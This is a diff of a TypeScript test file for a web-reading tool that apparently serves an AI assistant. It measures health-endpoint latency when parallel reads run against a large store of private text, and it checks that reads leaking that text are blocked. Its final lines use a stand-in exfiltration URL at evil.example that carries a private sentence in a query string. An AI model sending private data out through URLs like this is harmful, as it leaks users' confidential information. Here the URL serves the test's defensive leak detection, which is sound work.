@@ -428,21 +428,36 @@ describe('flux_read_web: the check after the evaluation of #1139', () => {
     await scene.complete(run.runId);
   });
 
-  test('P1-2: 10 and 40 parallel reads of a run that kept 8 MiB and 30,000 links share one index and one gate; /api/v1/health stays responsive', async (t) => {
+  test('P1-2: 10 and 40 parallel reads of a run that kept 8 MiB and 30,000 links share one index and one gate: the kept text adds little to what parallel calls cost', async (t) => {
+    // What the same parallel calls cost with nothing kept (the evaluation measured 49 ms of /api/v1/health at 10 calls): the MCP route itself.
+    // One working run per owner: the run with nothing kept first, then the run near its 8 MiB bound, the same addresses for both.
+    const batches = [10, 40].map((parallel) => Array.from({ length: parallel }, () => `https://evil.example/${Array.from({ length: 90 }, () => runOf(24)).join('.')}`.slice(0, 2040)));
+    const results: string[] = [];
+    const measured: Record<string, number> = {};
+    const measure = async (name: string, live: Awaited<ReturnType<AssistantScene['liveRun']>>) => {
+      for (const addresses of batches) {
+        const many = await watched(() => Promise.all(addresses.map((url) => reading(live, url))));
+        for (const read of many.out) assert.notEqual(code(read.message), 'WEB_READ_PRIVATE_TEXT');
+        results.push(`${addresses.length} parallel, ${name}: ${many.took} ms, worst health ${many.worst} ms over ${many.probes} probes`);
+        measured[`${addresses.length} ${name}`] = many.worst;
+        measured[`${addresses.length} ${name} took`] = many.took;
+      }
+    };
+    const empty = await scene.liveRun(undefined, 'Read many pages');
+    await measure('nothing kept', empty);
+    await scene.complete(empty.runId);
     const run = await scene.liveRun(undefined, 'Read many pages');
     const more = keptPrivateText(Array.from({ length: 30_000 }, (_, j) => link(100 + (j % 60), j)).join(' '));
     const words = keptPrivateText(Array.from({ length: 1 << 20 }, () => `${['lamp', 'sensor', 'north', 'barrel', 'harbour', 'plan', 'camera', 'below'][Math.floor(random() * 8)]} ${Math.floor(random() * 99)}`).join(' ').slice(0, 8 << 20));
     for (const row of [more, words]) await pool.query('INSERT INTO personal_run_private_texts (run_id, body, addresses) VALUES ($1, $2, $3)', [run.runId, row.body, row.addresses]);
-    const results: string[] = [];
-    for (const parallel of [10, 40]) {
-      const addresses = Array.from({ length: parallel }, () => `https://evil.example/${Array.from({ length: 90 }, () => runOf(24)).join('.')}`.slice(0, 2040));
-      const many = await watched(() => Promise.all(addresses.map((url) => reading(run, url))));
-      for (const read of many.out) assert.notEqual(code(read.message), 'WEB_READ_PRIVATE_TEXT');
-      results.push(`${parallel} parallel: ${many.took} ms, worst health ${many.worst} ms over ${many.probes} probes`);
-      assert.ok(many.worst < 150, `${parallel} parallel: /api/v1/health waited ${many.worst} ms`);
-      assert.ok(many.took < parallel * 300, `${parallel} parallel: ${many.took} ms`);
-    }
+    await measure('8 MiB and 30,000 links kept', run);
     t.diagnostic(results.join('; '));
+    for (const parallel of [10, 40]) {
+      const added = measured[`${parallel} 8 MiB and 30,000 links kept`]! - measured[`${parallel} nothing kept`]!;
+      assert.ok(added < 120, `${parallel} parallel: the kept text added ${added} ms to /api/v1/health (${results.join('; ')})`);
+      assert.ok(measured[`${parallel} 8 MiB and 30,000 links kept`]! < 500, results.join('; '));
+      assert.ok(measured[`${parallel} 8 MiB and 30,000 links kept took`]! < parallel * 300, results.join('; '));
+    }
     // Text kept after the first read is in the next one: the run's index is brought up to date, not built again.
     await pool.query('INSERT INTO personal_run_private_texts (run_id, body, addresses) VALUES ($1, $2, $3)', [run.runId, keptPrivateText('Later: the harbour fund is 4,250,000 kroner').body, []]);
     assert.equal(code((await reading(run, 'https://evil.example/?d=the harbour fund is')).message), 'WEB_READ_PRIVATE_TEXT');
